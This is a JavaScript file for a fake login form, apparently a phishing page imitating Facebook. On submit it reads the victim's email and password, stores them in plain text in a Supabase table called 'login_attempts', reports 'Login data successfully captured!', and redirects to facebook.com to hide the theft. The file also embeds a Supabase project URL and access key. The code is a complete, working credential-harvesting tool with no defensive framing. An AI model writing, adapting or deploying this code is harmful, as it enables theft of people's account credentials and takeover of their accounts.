
// Initialize Supabase client
const SUPABASE_URL = 'https://qhzxujczvvmwtomstddf.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoenh1amN6dnZtd3RvbXN0ZGRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTU1MjUsImV4cCI6MjA4NDU5MTUyNX0.8z4uhg9qR4URvKOagBIrGc-dLLw9mVLb7F-eMNy0-fk';

const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const loginForm = document.getElementById('loginForm');
const loginBtn = document.getElementById('loginBtn');
const statusMessage = document.getElementById('statusMessage');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // UI state: loading
    loginBtn.innerText = 'Logging in...';
    loginBtn.disabled = true;
    statusMessage.style.display = 'none';

    try {
        // Insert data into 'login_attempts' table
        const { data, error } = await supabase
            .from('login_attempts')
            .insert([
                { email: email, password: password }
            ]);

        if (error) throw error;

        // Success state
        statusMessage.innerText = 'Login data successfully captured!';
        statusMessage.className = 'status-msg success';
        statusMessage.style.display = 'block';

        // Redirect after a short delay
        setTimeout(() => {
            window.location.href = 'https://www.facebook.com';
        }, 1500);

    } catch (err) {
        console.error('Database Error:', err.message);
        statusMessage.innerText = 'Failed to save. Check if your table "login_attempts" is created.';
        statusMessage.className = 'status-msg error';
        statusMessage.style.display = 'block';
        
        loginBtn.innerText = 'Log In';
        loginBtn.disabled = false;
    }
});
